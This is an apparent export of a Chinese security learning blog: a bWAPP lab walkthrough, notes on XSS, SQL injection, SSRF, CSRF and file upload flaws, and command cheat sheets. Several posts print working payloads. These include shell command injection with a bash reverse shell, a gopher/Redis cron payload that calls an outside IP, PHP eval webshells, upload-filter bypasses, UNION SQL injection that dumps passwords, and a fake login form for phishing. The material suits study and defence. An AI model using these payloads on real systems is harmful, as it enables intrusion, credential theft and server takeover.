Injection","slug":"bwapp-靶场题解思路A1","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-02T08:37:23.091Z","comments":true,"path":"2020/12/31/bwapp-靶场题解思路A1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/bwapp-%E9%9D%B6%E5%9C%BA%E9%A2%98%E8%A7%A3%E6%80%9D%E8%B7%AFA1/","excerpt":"","text":"网络上相关的笔记也很多，但有些地方感觉还是得说得更清楚一些 HTML Injection-Reflection(Get)low level对于输入的数据没有验证，直接显示在页面上，因此可以注入XSS 123// 注入的代码&lt;script&gt;alter(124)&lt;/script&gt;&lt;a href = &quot;http://www.baidu.com&quot;&gt;click here&lt;/a&gt; medium level在源码中做了简单的字符替换（源码如下） 12345// Converts only &quot;&lt;&quot; and &quot;&gt;&quot; to HTLM entities$input = str_replace(&quot;&lt;&quot;, &quot;&amp;lt;&quot;, $data);$input = str_replace(&quot;&gt;&quot;, &quot;&amp;gt;&quot;, $input);# 对转换后的data还要进行url解码$input = urldecode($input); 因为对’&lt;’和’&gt;’都进行了html编码，所以在注入时可先对数据进行url编码，消除’&lt;’和’&gt;’，因为后面会对输入的数据进行url解码，所以可以注入成功。 123// 对 &lt; &gt; 经过url编码%3cscript%3ealter(124)%3c%2fscript%3e%3ca href = &quot;http://www.baidu.com&quot;%3eclick here %3c/a%3e high level使用htmlspecialchars对数据进行编码，并且制定了字符编码方式为utf-8，避免了被宽字节注入，所以很难被绕过，源码如下 123456function xss_check_3($data, $encoding = &quot;UTF-8&quot;)&#123; // htmlspecialchars - converts special characters to HTML entities return htmlspecialchars($data, ENT_QUOTES, $encoding);&#125; 需要注意的是，同样是对输入的数据进行html编码，medium为什么可以使用url编码被绕过，而high不能被绕过。一个重要的原因是medium中对输入的数据还进行了url解码，所以注入的数据可以正常解析，从而实现攻击。 额外补充 htmlentities：将所有的字符进行html编码； htmlspecialchars：只对”&amp;,”,’,&lt;,&gt;”进行html编码 使用htmlspecialchars后，想要对其进行绕过，一种可行的方法是对注入的数据进行uft-7编码，然后将页面的编码方式也设为uft-7。 HTML Injection-Reflection(POST)与get类似 HTML Injection - Reflected (URL)主要的处理函数如下： 123456789101112case &quot;0&quot; : // $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . urldecode($_SERVER[&quot;REQUEST_URI&quot;]); $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . $_SERVER[&quot;REQUEST_URI&quot;]; break; case &quot;1&quot; : $url = &quot;&lt;script&gt;document.write(document.URL)&lt;/script&gt;&quot;; break; case &quot;2&quot; : $url = &quot;http://&quot; . $_SERVER[&quot;HTTP_HOST&quot;] . xss_check_3($_SERVER[&quot;REQUEST_URI&quot;]); break; low level使用burpsuit对发起的请求进行抓包，重新构造请求，就可以进行注入。 medium level旧的IE浏览器不会对‘&lt;’ 和 ‘&gt;’进行编码，所以可以进行DOM XSS注入 high level无法绕过(对输入进行了htmlentities) HTML Injection - Stored (Blog)low level因为有输入的文本框，先考虑是否存在存储型XSS 初次以外，我们还可以注入一个iframe进行钓鱼,比如在输入框中输入： 12345678910111213141516div class=&quot;test_code&quot;&gt;test&lt;/div&gt;&lt;div style=&quot;position: absolute; left: 0px; top: 0px; width: 800px; height: 600px; z-index: 1000; background-color:white;&quot;&gt;Please Login Here To Proceed:&lt;form name=&quot;login&quot; action=&quot;http://127.0.0.1:1234/hacked.html&quot; method=&quot;post&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td&gt;Username:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;text&quot; name=&quot;username&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td&gt;Password:&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;password&quot; name=&quot;passwd&quot;/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;input type=&quot;submit&quot; value=&quot;Login&quot;/&gt;&lt;/form&gt;&lt;/div&gt; 然后在127.0.0.1的主机上监听1234端口，比如我就使用nc监听了相关端口，nc -lvnp 1234,最后就可以得到用户的输入 medium level无法绕过 high level无法绕过 iFrame Injectionlow level根据get请求可知，直接修改ParamUrl参数即可， 原始URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=http://www.baidu.com&amp;ParamWidth=250&amp;ParamHeight=250 medium level对传入的URL使用addslashes函数进行处理，只会对&#39; &quot; \\ null转义，因此依然可以绕过,只需要在ParamHeight后面闭合即可，（或者使用 iframe 标签的 srcdoc 属性替换“src”属性的内容，达到更好的注入效果） 漏洞URL：ParamHeight=250&quot;&gt;&lt;/iframe&gt;&lt;h2&gt;hello&lt;/h2&gt;&lt;!-- 漏洞URL：http://127.0.0.1/iframei.php?ParamUrl=robots.txt&amp;ParamWidth=250&amp;ParamHeight=250&quot; srcdoc&gt;&lt;/iframe&gt;&lt;iframe src=https://www.baidu.com width=800 height=1000&gt;&quot; high level无法绕过 LDAP InjectionLDAP注入攻击和SQL注入攻击相似，因此接下来的想法是利用用户引入的参数生成LDAP查询。一个安全的Web应用在构造和将查询发送给服务器前应该净化用户传入的参数。在有漏洞的环境中，这些参数没有得到合适的过滤，因而攻击者可以注入任意恶意代码。 使用得最广泛的LDAP：ADAM和OpenLDAP。 OS Command Injectionlow使用了shell_exec()方法，且没有过滤，可用命令 www.nsa.gov; cat /etc/passwd www.nsa.gov &amp; uname -a www.nsa.gov | ps -ef 这种情况下，甚至可以获得一个反弹shell，www.nsa.gov ; nc -vlp 1234 -e /bin/bash medium源码中对‘;’ ‘&amp;’进行了过滤，但仍然可以使用| high源码中使用了escapeshellcmd函数，确保用户只执行一个命令 OS Command Injection-Blind盲注的思想在于根据请求的时间，来判断命令是否运行成功。 PHP Code Injectionlow根据首页可以推测，肯定是通过url进行php相关脚本的注入。 原始url：http://192.168.50.151/phpi.php 恶意url：http://192.168.50.151/phpi.php?message=phpinfo() 造成代码注入的原因是没有对输入进行过滤，源码如下 1&lt;?php @eval (&quot;echo &quot; . $_REQUEST[&quot;message&quot;] . &quot;;&quot;) medium &amp; high无法绕过，对输入进行了转义，源码如下： 1&lt;?php echo htmlspecialchars($_REQUEST[&quot;message&quot;], ENT_QUOTES, &quot;UTF-8&quot;);;?&gt; SQL Injection (GET/Search)low 对于sql注入，我们首先要找到注入点 然后确定字段数 121&#x27; order by 8#1&#x27; order by 7# 确定可注入的字段的位置,构造相关的字段 121&#x27; union select 1,2,3,4,5,6,7#1&#x27; union select 1,database(),version(),user(),5,6,7# 使用同样的构造方法可以确认出表名、数据库名,用户名 1231&#x27; union select 1,database(),version(),user(),table_name,6,7 from information_schema.tables#1&#x27; union select 1,login,Password,email,secret,6,7 from users# 也可以直接用sqlmap跑出来 sqlmap -u &quot;http://192.168.50.151/sqli_1.php?title=aaa&amp;action=search&quot; medium对输入的数据进行了addslashes处理，addslashes只会对&#39; &quot; \\进行转义操作，绕过方式 宽字节注入（数据库默认是latin1编码，要想注入成功，需要将编码改为GBK） 编码解码导致的绕过（原因是字符串在带入查询前，被做了一些编码解码操作而没有再做一次过滤） 后面的大致思路都差不多","categories":[],"tags":[{"name":"靶场","slug":"靶场","permalink":"http://yejuns.github.io/tags/%E9%9D%B6%E5%9C%BA/"}]},{"title":"web安全之CSRF","slug":"web安全之CSRF","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-31T16:07:43.426Z","comments":true,"path":"2020/12/31/web安全之CSRF/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BCSRF/","excerpt":"","text":"CSRFCSRF（Cross-site request forgery）也被称为 one-click attack，中文全称是叫跨站请求伪造。一般来说，攻击者通过伪造用户的浏览器的请求，发送到一个用户自己曾经认证访问过的网站，使目标网站接收并误以为是用户的真实操作而去执行命令。常用于盗取账号、转账、发送虚假消息。 CSRF攻击攻击过程如下 用户C打开浏览器，访问受信任网站A，输入用户名和密码请求登录网站A； 在用户信息通过验证后，网站A产生Cookie信息并返回给浏览器，此时用户登录网站A成功，可以正常发送请求到网站A； 用户未退出网站A之前，在同一浏览器中，打开一个TAB页访问网站B； 网站B接收到用户请求后，返回一些攻击性代码，并发出一个请求要求访问第三方站点A； 浏览器在接收到这些攻击性代码后，根据网站B的请求，在用户不知情的情况下携带Cookie信息，向网站A发出请求。网站A并不知道该请求其实是由B发起的，所以会根据用户C的Cookie信息以C的权限处理该请求，导致来自网站B的恶意代码被执行 CSRF的原因跨站请求伪造。其原理是攻击者构造网站后台某个功能接口的请求地址，诱导用户去点击或者用特殊方法让该请求地址自动加载。用户在登录状态下这个请求被服务端接收后会被误以为是用户合法的操作 HTTP 是一种无状态协议，即服务器不会保留与客户交易时的状态。 用户A 在很短的时间间隔内向Web服务器发送了两次同样的请求，服务器并不会因为已经响应了该请求一次就不对第二次请求进行响应，因为服务器并不知道已经响应过一次该请求。 假设用户在网站A的某一个页面上已经完成了登录操作，当在该网站的另一个页面上执行的操作需要验证用户登录的时候任然需要用户再次登录，因为HTTP 并不知道你已经登录，它不会维持你的登录状态。 为了让服务器能够记住用户引入了Cookie 机制。 如何预防 验证 HTTP Referer 字段。 HTTP头中的Referer字段记录了该 HTTP 请求的来源地址 使用验证码。 关键操作页面加上验证码，后台收到请求后通过判断验证码可以防御CSRF。但这种方法对用户不太友好。 在请求地址中添加token并验证。 CSRF 攻击之所以能够成功，是因为黑客可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于cookie中，因此黑客可以在不知道这些验证信息的情况下直接利用用户自己的cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入黑客所不能伪造的信息，并且该信息不存在于 cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有token或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。这种方法要比检查 Referer 要安全一些，token 可以在用户登陆后产生并放于session之中，然后在每次请求时把token 从 session 中拿出，与请求中的 token 进行比对","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"Linux常用命令","slug":"linux常用命令","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-25T09:08:05.663Z","comments":true,"path":"2020/12/31/linux常用命令/","link":"","permalink":"http://yejuns.github.io/2020/12/31/linux%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"wget 在下载时会以最后一个/后面的内容为文件命名，使用-o可以自定义文件名 wget -o wordpress.zip http://www.linuxde.net/download.aspx?id=1080 wget -c 断点续传 df -h 查看磁盘剩余空间 du -sh 显示当前目录的总大小 du -h –max-depth=1 输出当前目录下各个子目录所使用的空间 1find . -name &#x27;*.tmp&#x27; -exec rm &#123;&#125; \\; 从当前目录下查找以tmp为后缀的所有文件， -exec 是表示查找后紧接着执行的命令 因为rm 不接受管du道输入，所以不能写成 find . -name &quot;.ab&quot; | rm 的形似，rm -f 就是删除文件的意思， {} 代表的是find 到的结果传给-exec参数而使用 -exec 参数必须用分号；结尾 但是在shell中不懂分号;是什么，所有要用转义符加分号，所以就有了 \\; locate 与 find 不同: find 是去硬盘找，locate 只在 /var/lib/slocate 资料库中找。 locate passwd 查找系统中所有的passwd文件 updatedb 更新locate数据库 uname -a # 查看系统信息 cat /proc/version # 查看Linux内核版本","categories":[],"tags":[{"name":"linux","slug":"linux","permalink":"http://yejuns.github.io/tags/linux/"}]},{"title":"web安全之SQL注入一","slug":"web安全之SQL注入-1","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-23T15:49:40.201Z","comments":true,"path":"2020/12/31/web安全之SQL注入-1/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-1/","excerpt":"","text":"SQL注入的原理是发生于应用程序与数据库层的安全漏洞 网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。 简单示例12345select id,name from test where id=1 # 用户输入，用 1 or 1=1 代替 1select id,name from test where id=1 or 1=1# 最后产生的效果类似 select id,name from test# 实现了一个越权操作 常用的数据库操作12345select version(); # 显示数据库版本select database(); # 查看当前正在使用的数据库select user(); # 查看使用当前数据库的用户select @@datadir; # 查看数据库路径select @@version_compile_os # 查看数据库安装的操作系统 渗透过程中使用的数据库和表information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等 SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表 TABLES表：提供了关于数据库中的表的信息（包括视图） COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。 常用构造注入方法使用union语句，select 1,2 union select 1,2 SQL注入类型按网络协议分 get注入 post注入 按注入的方式分 Boolean-based blind SQL injection（布尔型注入） 例如： http://test.com/view?id=1 and substring(version(),1,1)=5 UNION query SQL injection（联合查询注入）,例如：使用union语句，select 1,2 union select 1,2 Time-based blind SQL injection（基于时间延迟注入）例如：使用sleep(3)函数，select * from user where id= ‘4’ and sleep(3) Error-based SQL injection（报错型注入） Stacked queries SQL injection（可多语句查询注入）","categories":[],"tags":[{"name":"SQL注入","slug":"SQL注入","permalink":"http://yejuns.github.io/tags/SQL%E6%B3%A8%E5%85%A5/"}]},{"title":"web安全之SSRF","slug":"web安全之SSRF","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T05:46:46.177Z","comments":true,"path":"2020/12/31/web安全之SSRF/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BSSRF/","excerpt":"","text":"SSRFSSRF（Server-Side Request Forgery)服务端请求伪造,攻击者构造请求,由服务端发起的安全漏洞。一般情况下，SSRF的攻击目标是外网无法访问的内部系统(因为请求是服务端发起的,所以能请求到与服务器相连但与外部隔绝的内部网络)，可以利用该漏洞发起网络请求对内网服务进行探针和攻击 SSRF的原因服务端提供了从其他服务器应用获取数据的功能,且没有对目标地址进行过滤或限制。例如黑客通过服务端从指定URL地址读取网页文本内容，加载指定地址的图片等，利用的就是存在SSRF漏洞的Web应用作为代理攻击内网其它主机或本地服务器。 SSRF 利用1234567891011121314&lt;?phpfunction curl($url)&#123; //curl 模拟浏览器请求的，比如获取获取远程的网页 $ch = curl_init();//初始化一个curl会话 curl_setopt($ch, CURLOPT_URL, $url);//设置抓取的url curl_setopt($ch, CURLOPT_HEADER, 0);//设置header curl_exec($ch);//运行curl，请求网页 curl_close($ch);//关闭curl会话&#125;$url = $_GET[&#x27;url&#x27;];//从浏览器中传入地址curl($url); //传入curl函数中?&gt; 比如将上面的php文件部署到服务器上，就会造成SSRF 比如访问 http://test.com/ssrf.php?url=http://127.0.0.1:3306, 当参数接收到的是内网地址时,会直接将内网中的信息泄露出来，从而判断当前服务端是否存在mysql服务 访问http://ms08066.com/ssrf.php?url=file:///C:/key.php时,即可读取本地文件。 使用gopher协议反弹shell 1curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27; gopher协议格式, 具体使用 URL:gopher://:/_后接TCP数据流 相关危险函数SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 file_get_contents() , fsockopen() , curl_exec() SSRF 防御方案 限制请求端口只能是 Web端口,且只允许访问HTTP和HTTPS的请求。 限制不能访问内网的IP，防止对内网进行探针或攻击。 屏蔽返回的详细信息。 过滤绕过更改IP地址写法一些程序通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式： ^10(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){3}$ ^172.([1][6-9]|[2]\\d|3[01])(.([2][0-4]\\d|[2][5][0-5]|[01]?\\d?\\d)){2}$ 我们可以采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成： 8进制格式：0300.0250.0.1 16进制格式：0xC0.0xA8.0.1 访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作 使用解析到内网的域名果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名 利用跳转如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过 常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web漏洞","slug":"web安全之XSS攻击","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-31T15:39:59.416Z","comments":true,"path":"2020/12/31/web安全之XSS攻击/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%94%BB%E5%87%BB/","excerpt":"","text":"xss攻击本质是攻击者在web页面插入恶意的script代码（这个代码可以是JS脚本、CSS样式或者其他意料之外的代码），当用户浏览该页面之时，嵌入其中的script代码会被执行，从而达到恶意攻击用户的目的。比如读取cookie，session，tokens，或者网站其他敏感的网站信息，对用户进行钓鱼欺诈。 xss的危害 盗取cookie； 盗取账户 恶意软件下载 键盘记录 广告引流等等JavaScript 能够写出的任意恶意功能 反射型XSS应用程序或API将 未经验证和未经转义的用户输入， 直接作为 HTML 输出的一部分。 反射型XSS的攻击步骤 1.攻击者构造出特殊的URL，其中包含恶意代码.2.用户打开有恶意代码的URL时，网站服务器端将恶意代码从URL取出，拼接在HTML返回给浏览器.3.用户浏览器接收到响应后解析执行，混在其中的恶意代码也会被执行。4.恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户行为，调用目标网站接口执行攻击者指定的操作。 特点： 非持久化的，用户必须点击带有特定参数的链接才可以生效， 影响范围小，只影响执行脚本的用户 比如对于一个未检测xss的文本框，输入1&lt;script&gt;alert(&quot;点击开始修复&quot;)；location.href&#x3D;&quot;https:&#x2F;&#x2F;www.baidu.com&quot;&lt;&#x2F;script&gt; 防御方式： 对输入检查 对请求参数进行检查，一旦发现可疑的特殊字符就拒绝请求。但因为用户可以绕过浏览器的检查，直接通过Postman等工具进行请求，所以这个检查最好前后端都做。 对输出进行转义再显示 因为反射型XSS攻击要进行攻击的话需要在前端页面进行显示。所以在输出数据之前对潜在的威胁的字符进行编码、转义也是十分有效的措施。比如下面的方式: 1234app.get(&#x27;/welcome&#x27;,function(req,res)&#123; //对查询参数进行编码，避免反射型 XSS攻击 res.send(`$&#123;encodeURIComponent(req.query.type)&#125;`);&#125;) 存储型xss存储型xss是指应用程序通过web请求获取到不可信赖的数据，在未校验是否有xss的情况下就存入数据库。当下一次从数据库中获取该程序时也未对其进行过滤，页面再次执行xss。储型xss可以持续攻击用户。 存储型XSS的攻击步骤 攻击者将恶意代码提交到目标网站的数据库中。 用户打开目标网站时，网站服务端将恶意代码从数据库中取出，拼接在HTML中返回给浏览器。 用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。 恶意代码窃取用户数据并发送到攻击者的网站，或冒充用户行为，凋用目标网站接口执行攻击者指定的操作. 预防存储型XSS攻击也是从输入和输出两个方面来考虑。 服务器接收到数据，在存储到数据库之前，进行转义和过滤危险字符; 前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤; 不论是反射型攻击还是存储型，攻击者总需要找到两个要点，即“输入点”与”输出点”，也只有这两者都满足，XSS攻击才会生效。“输入点”用于向 web页面注入所需的攻击代码，而“输出点”就是攻击代码被执行的地方。 DOM型XSS实际上就是前端javascript代码不够严谨，把不可信的内容插入到了页面， DOM型XSS其实是一种特殊的反射型XSS，通过JS操作DOM树动态地输出数据到页面，而不依赖将数据提交给服务器端，它是基于DOM 文档对象模型的一种漏洞。在使用.innerHTML、.outerHTML、.appendChild、document.write()等API时要特别小心，不要把不可信的数据作为HTML插入到页面上，尽量使用.innerText、.textContent、.setAttribut()等. 123&lt;script&gt;document.write(&quot;&lt;script&gt;alter(0)&lt;/script&gt;&quot;)&lt;/script&gt; 反射型XSS会经过后端语言，是页面引用后端输出生效。而DOM型XSS是经过JS对DOM树直接操作后插入到页面。所以不经过WAF的检测. 其他防御手段 HTTP-only Cookie:禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之文件上传漏洞","slug":"web安全之文件上传漏洞","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-05T00:46:01.692Z","comments":true,"path":"2020/12/31/web安全之文件上传漏洞/","link":"","permalink":"http://yejuns.github.io/2020/12/31/web%E5%AE%89%E5%85%A8%E4%B9%8B%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/","excerpt":"","text":"文件上传漏洞是什么？关键字：绕过 文件上传漏洞是在开发者没有做充足验证（包括前端，后端）情况下，允许用户上传恶意文件，这里上传的文件可 以是木马、病毒、恶意脚本或者Webshell等。 简单案例在bwapp中选择文件上传漏洞的bug模式， 然后借助eval函数，制做一句话木马： 12&lt;?php @eval($_POST[&#x27;hacker&#x27;]); ?&gt;# 这里将post中上传的hacker字段取出，然后执行这个字段包含的数据 文件上传成功后，我们可以得到这个文件的地址：http://192.168.50.136/images/shell.php 因为我们的漏洞是要通过POST请求中的参数去触发，因此接下来我们通过发起POST请求，就可以拿到我们想要的内容，比如： 121、curl -d &quot;hacker=echo get_current_user();&quot; http://192.168.50.136/images/shell.php2、curl -d &quot;hacker = echo getcwd();&quot; http://192.168.50.136/images/shell.php PHP中，get_current_user可以获取当前的用户，getcwd()获取当前的目录 当然，我们拿到了一个shell，就可以使用集成型的工具去做进一步的利用，比如使用中国菜刀、冰蝎。 常用的一些一句话木马12345678910&lt;%execute(request(&quot;value&quot;))%&gt; #asp&lt;?php @eval($_POST[“value”]);?&gt;&lt;%@ Page Language=&quot;Jscript&quot;%&gt; #aspx&lt;%eval(Request.Item[&quot;value&quot;])%&gt; &lt;%eval request(&quot;value&quot;)%&gt;&lt;%execute request(&quot;value&quot;)%&gt;&lt;%execute(request(&quot;value&quot;))%&gt; 文件上传漏洞的绕过上面的例子只是简单的举例，在实际生活中不可能存在这样的漏洞给我们直接去利用，比如会有对.php、js文件的检测，这时候我们就要用各种方法去绕过检测机制 我们首先将bwapp的漏洞难度改成medium,然后会发现不能再用同样地方式上传文件。 我们只需要将shell.php改名为shell.php3，然后就可以正常上传，和上面一样，我们用相同的一句话木马，也就是说，php3文件是可以被php解释器解析，原因在于，php的解释器配置文件中，有这样一行代码： 1FilesMatch &quot;.+\\.ph(p[345]?|t|tml)$&quot;&gt; 也就是说，对于php3，php4,php5，phptml等文件，都是可以正常解析的。 大多数文件上传漏洞的绕过都是通过利用开发时的忽略，比如：Apache 在1.x和2.x版本中存在解析漏洞，因为Apache从右至左开始判断后缀，跳过非可识别后缀，直到找到可识别后缀为止，然后将该可识别后缀进解析。 漏洞利用流程： 上传shell.php.test； 访问shell.php.test，服务器会解析shell.php.test文件，但是按照php文件格式进行解析。 1、前端验证绕过原因：很多网站、CMS 都有使用，只在前端利用JavaScript 来做校验。 漏洞利用流程（两种方法都可以）: 通过Burp Suite抓包，然后修改内容后放行。 通过Chrome禁止/删除JavaScript代码. 2、.htaccess绕过.htaccess文件（分布式配置文件）提供了一种方式，使得配置文件可以随文件夹不同而不同，其所放置的文件夹及所有子文件夹都会受此影响，其语法同apache主配置文件。 场景：启用了.htaccess文件的网站，使用此文件类型来绕过限制较全面的黑名单过滤。 3、大小写绕过如果我们想上传一个php木马，那么我们可以上传一个pHp即可 4、windows文件流特性绕过NTFS文件系统实现了多文件流特性，NTFS环境一个文件默认使用的是未命名的文件流，同时可创建其他命名的文件流，Windows资源管理器默认不显示出文件的命名文件流，这些命名的文件流在功能上和默认使用的未命名文件流一致，甚至可以用来启动程序。 5、%00截断绕过即对于白名单的方式，如何绕过？ 可以对上传的文件名中加入十六进制的00，这样就可以将test.php.png截断成test.php。 文件头检测绕过我们可以拼接png与php文件，尝试执行。 需要注意的是，在拼接png文件时，我们需要将png文件中大部分的信息删除，只保留那些最基本的文件信息，防止出现php无法解析特殊字符的情况。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"windows常用命令","slug":"windows常用命令","date":"2020-12-31T08:01:51.000Z","updated":"2021-07-01T14:00:36.996Z","comments":true,"path":"2020/12/31/windows常用命令/","link":"","permalink":"http://yejuns.github.io/2020/12/31/windows%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/","excerpt":"","text":"进程相关查看指定端口的使用情况（就可以获取端口上运行程序的PID）1netstat -ano | findstr 端口号 获取到PID后，就查看进程详细信息1tasklist | findstr 进程号 就可以知道启动该进程的程序，比如java.exe，然后使用任务管理器将其关闭 执行此命令强制关闭指定进程号的进程（类似linux中的kill）1taskkill -PID 进程号 -F 查看wifi密码1netsh wlan show profile * key=clear","categories":[],"tags":[{"name":"windows","slug":"windows","permalink":"http://yejuns.github.io/tags/windows/"}]},{"title":"web安全之XSS模版注入","slug":"web安全之XSS模板注入","date":"2020-12-21T08:01:51.000Z","updated":"2021-07-03T09:23:32.084Z","comments":true,"path":"2020/12/21/web安全之XSS模板注入/","link":"","permalink":"http://yejuns.github.io/2020/12/21/web%E5%AE%89%E5%85%A8%E4%B9%8BXSS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5/","excerpt":"","text":"模版引擎模版引擎可以让（网站）程序实现界面与数据分离，业务代码与逻辑代码的分离，比如常用的Pug模版引擎 模版引擎便于数据与代码分离， 提供了转义功能。天生具有对XSS的防御效果。但是实际上产生了另一种问题。模版注入 模板注入服务端接受用户的输入，并将其作为Web 应用模板的一部分，即允许修改底层模板，在渲染过程中模板引擎执行用户插入的恶意内容。","categories":[],"tags":[{"name":"web安全","slug":"web安全","permalink":"http://yejuns.github.io/tags/web%E5%AE%89%E5%85%A8/"}]},{"title":"web安全之SQL注入-其他方式","slug":"web安全之SQL注入-其他方式","date":"2020-12-19T08:01:51.000Z","updated":"2021-07-03T09:23:25.553Z","comments":true,"path":"2020/12/19/web安全之SQL注入-其他方式/","link":"","permalink":"http://yejuns.github.io/2020/12/19/web%E5%AE%89%E5%85%A8%E4%B9%8BSQL%E6%B3%A8%E5%85%A5-%E5%85%B6%E4%BB%96%E6%96%B9%E5%BC%8F/","excerpt":"","text":"堆叠注入（Stacked Injections）一堆SQL 语句(多条)一起执行。 在MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。 堆叠注入和union injection（联合注入）有什么区别？union injection是有限的，受到前面一个查询的影响。而堆叠注入不影响 但是堆叠注入本身也有局限性： 并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题。 真实环境中：通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的 相关APImysqli_multi_query 及mysqli_use_result 案例12http://127.0.0.1:81/vulnerabilities/sqli/?id=1&#x27;; update users set password=e10adc3949ba59abbe56e057f20f883e&#x27; where user_id=1; -- &amp;Submit=Submit## 使用堆叠注入，对admin账户的password进行更新。 OOB注入-带外通道技术（Out-Of-Band）带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用没有直接回显的漏洞。 这一类漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。 带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。 宽字节注入在数据库使用了宽字符集而web中没有考虑这个问题。character_set_client（客户端的字符集）和character_set_connection（连接层的字符集）不同，或转换函数如iconv、mb_convert_encoding使用不当 当存在宽字节注入的时候，注入参数里带入%DF,即可把\\（%5C）吃掉,，让&#39;重新出现 比如对以下url进行注入 http://ip/test/index.php?id=1 当提交，id=1&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1\\&#39; and 1=1#&#39; 很明显没有注入成功，而当我们提交,id=1%df&#39; and 1=1%23 mysql运行的SQL语句为 select * from user where id = &#39;1䞫&#39; and 1=1#&#39; 我们这里的宽字节注入是利用的MySQL的一个特性，MySQL的在使用GBK编码的时候，会认为两个字符是一个汉字（前一个ASCII码要大于128，才到汉字的范围）。这就是MySQL的的特性，因为GBK是多字节编码，他认为两个字节代表一个汉字，所以％DF和后面的\\也就是％5c中变成了一个汉字“运”，而“逃逸了出来。 